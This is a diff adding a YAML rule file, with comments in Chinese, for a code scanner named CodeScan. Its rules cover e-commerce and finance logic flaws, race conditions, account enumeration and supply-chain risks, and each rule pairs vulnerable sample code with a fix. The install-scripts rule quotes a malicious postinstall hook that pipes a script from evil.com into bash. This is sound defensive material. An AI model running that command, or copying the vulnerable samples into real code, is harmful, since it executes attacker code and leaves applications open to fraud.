@@ -1,0 +1,576 @@
+# =============================================================================
+# CodeScan Business Logic & Supply Chain Rules - 业务逻辑与供应链安全规则库
+# =============================================================================
+# 版本: 1.0.0
+# 创建: 2025-01-23
+# 描述: 业务逻辑漏洞、竞态条件、供应链安全规则
+# =============================================================================
+
+_metadata:
+  version: "1.0.0"
+  last_updated: "2025-01-23"
+  description: |
+    业务逻辑与供应链安全规则库，覆盖:
+    - 电商业务逻辑（价格、库存、订单、优惠券）
+    - 金融业务逻辑（转账、余额、利息）
+    - 用户管理（注册、密码重置、账户枚举）
+    - 竞态条件
+    - 供应链安全
+
+rules:
+  # ===========================================================================
+  # 电商业务逻辑规则
+  # ===========================================================================
+
+  - id: biz-price-manipulation
+    name: 价格篡改风险
+    rule_type: pattern
+    category: business-logic
+    risk_level: critical
+    languages: [python, javascript, typescript, java, php, ruby]
+    patterns:
+      - "price"
+      - "amount"
+      - "total"
+      - "unit_price"
+      - "subtotal"
+    description: |
+      从客户端接收价格信息可能被篡改，
+      攻击者可修改请求中的价格为极低值或负数。
+    example: |
+      # 漏洞代码示例
+      @app.route('/checkout', methods=['POST'])
+      def checkout():
+          price = request.form.get('price')  # 危险：信任客户端价格
+          quantity = request.form.get('quantity')
+          total = float(price) * int(quantity)
+          process_payment(total)
+
+      # 攻击者可提交: price=0.01
+    attack_scenario: |
+      攻击者篡改购物车请求中的价格字段，
+      以极低价格购买商品。
+    fix_suggestion: |
+      1. 价格必须从服务端数据库读取
+      2. 仅信任商品 ID 和数量
+      3. 服务端重新计算总价
+
+      # 安全示例
+      @app.route('/checkout', methods=['POST'])
+      def checkout():
+          product_id = request.form.get('product_id')
+          quantity = int(request.form.get('quantity'))
+          product = Product.query.get(product_id)
+          total = product.price * quantity  # 从数据库读取价格
+          process_payment(total)
+    cwe_ids: ["CWE-472", "CWE-20"]
+    owasp_ids: ["A04:2021"]
+    tags: [business-logic, price, ecommerce, critical]
+
+  - id: biz-quantity-negative
+    name: 负数量订单
+    rule_type: pattern
+    category: business-logic
+    risk_level: high
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "quantity"
+      - "qty"
+      - "count"
+      - "amount"
+    description: |
+      未验证数量为正数可能导致:
+      1. 负数量产生退款
+      2. 库存计算错误
+      3. 价格计算为负数
+    example: |
+      # 漏洞代码示例
+      quantity = int(request.form.get('quantity'))
+      total = price * quantity  # quantity 可能为负数
+
+      # 攻击: quantity=-10 导致 total 为负
+    fix_suggestion: |
+      quantity = int(request.form.get('quantity'))
+      if quantity <= 0:
+          return "Invalid quantity", 400
+    cwe_ids: ["CWE-20"]
+    tags: [business-logic, quantity, validation]
+
+  - id: biz-coupon-reuse
+    name: 优惠券重复使用
+    rule_type: pattern
+    category: business-logic
+    risk_level: high
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "coupon"
+      - "voucher"
+      - "promo_code"
+      - "discount_code"
+      - "apply_coupon"
+    description: |
+      优惠券验证逻辑可能存在:
+      1. 重复使用同一优惠券
+      2. 多个优惠券叠加
+      3. 过期优惠券可用
+    example: |
+      # 漏洞代码示例
+      @app.route('/apply-coupon', methods=['POST'])
+      def apply_coupon():
+          code = request.form.get('code')
+          coupon = Coupon.query.filter_by(code=code).first()
+          if coupon:
+              session['discount'] = coupon.discount
+              # 未检查：是否已使用、是否过期、是否已有优惠
+    fix_suggestion: |
+      1. 检查优惠券是否已被该用户使用
+      2. 检查优惠券是否过期
+      3. 检查是否已应用其他优惠券
+      4. 使用数据库事务保证原子性
+
+      # 安全示例
+      if coupon.used_by_user(current_user):
+          return "Coupon already used", 400
+      if coupon.expired:
+          return "Coupon expired", 400
+      if order.has_discount:
+          return "Already has discount", 400
+    cwe_ids: ["CWE-840"]
+    tags: [business-logic, coupon, ecommerce]
+
+  - id: biz-inventory-race
+    name: 库存竞态条件
+    rule_type: pattern
+    category: business-logic
+    risk_level: high
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "inventory"
+      - "stock"
+      - "quantity"
+      - "decrement"
+      - "-="
+      - "update"
+    description: |
+      库存减少操作可能存在竞态条件，
+      允许超卖或负库存。
+    example: |
+      # 漏洞代码示例 - TOCTOU
+      product = Product.query.get(product_id)
+      if product.stock >= quantity:  # 检查
+          product.stock -= quantity  # 使用
+          db.session.commit()
+          # 并发时可能超卖
+    fix_suggestion: |
+      1. 使用数据库原子操作
+      2. 使用悲观锁或乐观锁
+
+      # 安全示例 - 原子更新
+      result = db.session.execute(
+          "UPDATE products SET stock = stock - :qty "
+          "WHERE id = :id AND stock >= :qty",
+          {"id": product_id, "qty": quantity}
+      )
+      if result.rowcount == 0:
+          return "Out of stock", 400
+    cwe_ids: ["CWE-362", "CWE-367"]
+    tags: [business-logic, inventory, race-condition]
+
+  - id: biz-order-status-bypass
+    name: 订单状态绕过
+    rule_type: pattern
+    category: business-logic
+    risk_level: high
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "order.status"
+      - "order_status"
+      - "orderStatus"
+      - "setState"
+      - "status ="
+    description: |
+      订单状态修改逻辑可能存在:
+      1. 跳过中间状态
+      2. 逆向状态转换
+      3. 未授权修改状态
+    example: |
+      # 漏洞代码示例
+      @app.route('/order/<id>/status', methods=['POST'])
+      def update_status(id):
+          order = Order.query.get(id)
+          new_status = request.form.get('status')
+          order.status = new_status  # 未验证状态转换
+          db.session.commit()
+
+      # 攻击者可将已取消订单改为已完成
+    fix_suggestion: |
+      使用状态机严格控制状态转换
+
+      # 定义允许的状态转换
+      ALLOWED_TRANSITIONS = {
+          'pending': ['paid', 'cancelled'],
+          'paid': ['shipped', 'refunding'],
+          'shipped': ['delivered'],
+          'delivered': ['completed'],
+      }
+
+      if new_status not in ALLOWED_TRANSITIONS.get(order.status, []):
+          return "Invalid status transition", 400
+    cwe_ids: ["CWE-840"]
+    tags: [business-logic, order, state-machine]
+
+  # ===========================================================================
+  # 金融业务逻辑规则
+  # ===========================================================================
+
+  - id: fin-transfer-race
+    name: 转账竞态条件
+    rule_type: pattern
+    category: business-logic
+    risk_level: critical
+    languages: [python, javascript, typescript, java]
+    patterns:
+      - "transfer"
+      - "withdraw"
+      - "deposit"
+      - "balance"
+      - "debit"
+      - "credit"
+    description: |
+      余额扣减操作可能存在竞态条件，
+      允许用户透支或双花。
+    example: |
+      # 漏洞代码示例 - 双花攻击
+      @app.route('/transfer', methods=['POST'])
+      def transfer():
+          from_account = Account.query.get(from_id)
+          if from_account.balance >= amount:  # 检查
+              from_account.balance -= amount  # 使用
+              to_account.balance += amount
+              db.session.commit()
+          # 并发请求可能导致透支
+    attack_scenario: |
+      攻击者同时发起多个转账请求，
+      在余额检查和扣减之间的时间窗口内完成多次转账。
+    fix_suggestion: |
+      1. 使用数据库事务 + SELECT FOR UPDATE
+      2. 使用乐观锁（版本号）
+      3. 在数据库层面约束余额 >= 0
+
+      # 安全示例
+      with db.session.begin():
+          from_account = Account.query.with_for_update().get(from_id)
+          if from_account.balance < amount:
+              raise InsufficientFunds()
+          from_account.balance -= amount
+          to_account = Account.query.with_for_update().get(to_id)
+          to_account.balance += amount
+    cwe_ids: ["CWE-362", "CWE-367"]
+    owasp_ids: ["A04:2021"]
+    tags: [business-logic, finance, race-condition, critical]
+
+  - id: fin-refund-abuse
+    name: 退款滥用
+    rule_type: pattern
+    category: business-logic
+    risk_level: critical
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "refund"
+      - "chargeback"
+      - "return"
+      - "reimburse"
+    description: |
+      退款逻辑可能存在:
+      1. 重复退款
+      2. 超额退款
+      3. 未验证退款资格
+    example: |
+      # 漏洞代码示例
+      @app.route('/refund', methods=['POST'])
+      def refund():
+          order_id = request.form.get('order_id')
+          order = Order.query.get(order_id)
+          refund_amount = request.form.get('amount')  # 信任客户端金额
+          user.balance += float(refund_amount)
+          db.session.commit()
+    fix_suggestion: |
+      1. 检查订单是否已退款
+      2. 退款金额不超过订单金额
+      3. 使用事务保证原子性
+      4. 记录退款审计日志
+
+      # 安全示例
+      if order.refunded:
+          return "Already refunded", 400
+      if order.status not in ['delivered', 'completed']:
+          return "Cannot refund", 400
+      refund_amount = order.total  # 从订单获取金额
+      order.refunded = True
+      user.balance += refund_amount
+    cwe_ids: ["CWE-840"]
+    tags: [business-logic, refund, finance, critical]
+
+  - id: fin-precision-error
+    name: 金额精度错误
+    rule_type: pattern
+    category: business-logic
+    risk_level: medium
+    languages: [python, javascript, typescript, java]
+    patterns:
+      - "float"
+      - "double"
+      - "round"
+      - "toFixed"
+    description: |
+      使用浮点数处理金额会导致精度错误，
+      可能在大量交易中累积为显著差异。
+    example: |
+      # 漏洞代码示例
+      price = 0.1 + 0.2  # 结果是 0.30000000000000004
+      total = float(price) * quantity
+    fix_suggestion: |
+      1. 使用 Decimal 类型
+      2. 以最小货币单位（分）存储整数
+      3. 使用专门的货币库
+
+      # Python 安全示例
+      from decimal import Decimal
+      price = Decimal('0.1') + Decimal('0.2')
+
+      # 或使用分为单位
+      price_cents = 10 + 20  # 30 分
+    cwe_ids: ["CWE-682"]
+    tags: [business-logic, precision, finance]
+
+  # ===========================================================================
+  # 用户管理规则
+  # ===========================================================================
+
+  - id: user-account-enumeration
+    name: 账户枚举
+    rule_type: pattern
+    category: auth
+    risk_level: medium
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "user_exists"
+      - "email_exists"
+      - "username_taken"
+      - "not found"
+      - "does not exist"
+    description: |
+      登录、注册、密码重置功能可能泄露账户存在信息，
+      帮助攻击者确定有效用户名。
+    example: |
+      # 漏洞示例 - 不同错误消息
+      if not user:
+          return "User not found"  # 泄露：用户不存在
+      if not check_password(password, user.password):
+          return "Wrong password"  # 泄露：用户存在
+    fix_suggestion: |
+      使用统一的错误消息
+
+      # 安全示例
+      user = User.query.filter_by(email=email).first()
+      if not user or not check_password(password, user.password):
+          return "Invalid email or password"  # 统一消息
+    cwe_ids: ["CWE-204"]
+    tags: [auth, enumeration, user]
+
+  - id: user-password-reset-token-weak
+    name: 密码重置令牌不安全
+    rule_type: pattern
+    category: auth
+    risk_level: high
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "reset_token"
+      - "password_reset"
+      - "forgot_password"
+      - "recovery_token"
+    description: |
+      密码重置令牌可能存在:
+      1. 可预测（时间戳、自增 ID）
+      2. 永不过期
+      3. 可重复使用
+      4. 通过 URL 参数泄露
+    example: |
+      # 漏洞代码示例
+      import time
+      reset_token = str(int(time.time()))  # 可预测
+
+      # 或
+      reset_token = str(user.id)  # 可猜测
+    fix_suggestion: |
+      1. 使用安全随机数生成令牌
+      2. 设置短期过期时间（15-60 分钟）
+      3. 使用后立即失效
+      4. 限制尝试次数
+
+      # 安全示例
+      import secrets
+      reset_token = secrets.token_urlsafe(32)
+      token_expires = datetime.utcnow() + timedelta(hours=1)
+    cwe_ids: ["CWE-640", "CWE-330"]
+    tags: [auth, password-reset, token]
+
+  - id: user-registration-abuse
+    name: 注册滥用
+    rule_type: pattern
+    category: auth
+    risk_level: medium
+    languages: [python, javascript, typescript, java, php]
+    patterns:
+      - "register"
+      - "signup"
+      - "create_user"
+      - "new_user"
+    description: |
+      注册功能可能被滥用:
+      1. 批量注册垃圾账户
+      2. 邮箱轰炸
+      3. 资源耗尽
+    fix_suggestion: |
+      1. 实施 CAPTCHA
+      2. 频率限制
+      3. 邮箱验证
+      4. 手机号验证
+    cwe_ids: ["CWE-770", "CWE-799"]
+    tags: [auth, registration, abuse]
+
+  # ===========================================================================
+  # 供应链安全规则
+  # ===========================================================================
+
+  - id: supply-chain-typosquatting
+    name: 依赖名称拼写错误检测
+    rule_type: pattern
+    category: other
+    risk_level: high
+    languages: [python, javascript, typescript]
+    patterns:
+      - "import"
+      - "require"
+      - "from.*import"
+    description: |
+      依赖名称拼写错误可能导致安装恶意包（typosquatting）。
+      攻击者注册与流行包相似名称的恶意包。
+    example: |
+      # 常见 typosquatting 示例
+      # 正确: requests     错误: requets, request, reqeusts
+      # 正确: django       错误: djano, djangoo
+      # 正确: tensorflow   错误: tensroflow, tenserflow
+    fix_suggestion: |
+      1. 使用 lock 文件锁定依赖版本
+      2. 审查新增依赖
+      3. 使用 pip-audit / npm audit 扫描
+      4. 配置私有镜像源
+    cwe_ids: ["CWE-829", "CWE-494"]
+    tags: [supply-chain, typosquatting]
+
+  - id: supply-chain-install-scripts
+    name: 危险的安装脚本
+    rule_type: pattern
+    category: injection
+    risk_level: high
+    languages: [javascript, python]
+    patterns:
+      - "postinstall"
+      - "preinstall"
+      - "scripts"
+      - "setup.py"
+    description: |
+      包的安装脚本（postinstall 等）可在安装时执行任意代码，
+      恶意包可能利用此窃取凭证或植入后门。
+    example: |
+      # package.json 中的恶意脚本
+      {
+        "scripts": {
+          "postinstall": "curl https://evil.com/steal.sh | bash"
+        }
+      }
+    fix_suggestion: |
+      1. 使用 npm install --ignore-scripts
+      2. 审查包的 package.json
+      3. 使用 npm ci 而非 npm install
+      4. 启用 npm audit
+    cwe_ids: ["CWE-94", "CWE-829"]
+    tags: [supply-chain, install-scripts]
+
+  - id: supply-chain-dynamic-import
+    name: 动态依赖加载
+    rule_type: sink
+    category: injection
+    risk_level: high
+    languages: [python, javascript, typescript]
+    patterns:
+      - "__import__"
+      - "importlib.import_module"
+      - "require(variable"
+      - "import(variable"
+      - "eval"
+    description: |
+      动态加载依赖可能引入恶意代码，
+      如果模块名来自用户输入更加危险。
+    example: |
+      # 漏洞代码示例
+      module_name = request.args.get('module')
+      module = __import__(module_name)  # 危险
+
+      # JavaScript
+      const moduleName = req.query.module;
+      const mod = require(moduleName);  // 危险
+    fix_suggestion: |
+      1. 使用白名单验证模块名
+      2. 避免从用户输入动态加载
+
+      # 安全示例
+      ALLOWED_MODULES = ['json', 'datetime', 'collections']
+      if module_name in ALLOWED_MODULES:
+          module = __import__(module_name)
+    cwe_ids: ["CWE-94", "CWE-829"]
+    tags: [supply-chain, dynamic-import]
+
+  - id: supply-chain-lockfile-missing
+    name: 依赖锁文件缺失
+    rule_type: pattern
+    category: other
+    risk_level: medium
+    languages: [python, javascript, typescript]
+    patterns:
+      - "package-lock.json"
+      - "yarn.lock"
+      - "Pipfile.lock"
+      - "poetry.lock"
+      - "requirements.txt"
+    description: |
+      缺少锁文件可能导致:
+      1. 构建不可重复
+      2. 依赖升级引入漏洞
+      3. 供应链攻击
+    fix_suggestion: |
+      1. 使用锁文件固定依赖版本
+      2. 将锁文件提交到版本控制
+      3. 定期更新并审查依赖
+    cwe_ids: ["CWE-829"]
+    tags: [supply-chain, lockfile]
+
+  - id: supply-chain-outdated-deps
+    name: 过时的依赖
+    rule_type: pattern
+    category: other
+    risk_level: medium
+    languages: [python, javascript, typescript, java]
+    patterns:
+      - "dependencies"
+      - "devDependencies"
+      - "requirements"
+    description: |
+      使用过时的依赖可能包含已知漏洞。
+    fix_suggestion: |
+      1. 定期运行 npm audit / pip-audit / snyk
+      2. 使用 Dependabot 或 Renovate 自动更新
+      3. 订阅安全公告
+    cwe_ids: ["CWE-1035", "CWE-937"]
+    tags: [supply-chain, outdated, sca]
